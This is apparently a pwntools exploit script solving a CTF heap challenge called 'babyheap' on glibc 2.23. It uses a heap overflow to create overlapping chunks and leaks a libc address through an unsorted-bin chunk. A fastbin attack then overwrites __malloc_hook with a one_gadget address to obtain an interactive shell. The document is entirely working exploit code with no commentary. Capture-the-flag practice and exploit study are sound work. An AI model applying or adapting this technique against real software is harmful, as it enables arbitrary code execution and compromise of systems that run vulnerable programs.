from pwn import *

def add(size):
	p.recvuntil(b'Command: ')
	p.sendline(b'1')
	p.recvuntil(b'Size: ')
	p.sendline(str(size))

def edit(idx, size, content):
	p.recvuntil(b'Command: ')
	p.sendline(b'2')
	p.recvuntil(b'Index:')
	p.sendline(str(idx))
	p.recvuntil(b'Size: ')
	p.sendline(str(size))
	p.recvuntil(b'Content: ')
	p.send(content)

def delete(idx):
	p.recvuntil(b'Command: ')
	p.sendline(b'3')
	p.recvuntil(b'Index:')
	p.sendline(str(idx))

def show(idx):
	p.recvuntil(b'Command: ')
	p.sendline(b'4')
	p.recvuntil(b'Index:')
	p.sendline(str(idx))

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./babyheap')
elf = ELF('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

add(0x10) #0
add(0x10) #1
add(0x10) #2
add(0x10) #3
add(0x90) #4
add(0x10) #5
add(0x60) #6
delete(1)
delete(2)
edit(0, 0x41, b'\x00' * 0x18 + p64(0x21) + b'\x00' * 0x18 + p64(0x21) + b'\x80')
edit(3, 0x20, b'\x00' * 0x18 + p64(0x21))

add(0x10) #1
add(0x10) #2
edit(3, 0x20, b'\x00' * 0x18 + p64(0xa1))
delete(4)
show(2)

p.recvuntil(b'Content: \n')
libc_base = u64(p.recvline()[0:6] + b'\x00' * 0x2) - 0x3c4b78
print("libc base:", hex(libc_base))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x4527a
delete(6)
edit(5, 0x28, b'\x00' * 0x18  + p64(0x70) + p64(malloc_hook - 0x23))
add(0x60) #4
add(0x60) #6
edit(6, 0x13 + 0x8, b'a' * 0x13 + p64(one_gadget))

add(0x10)

p.interactive()
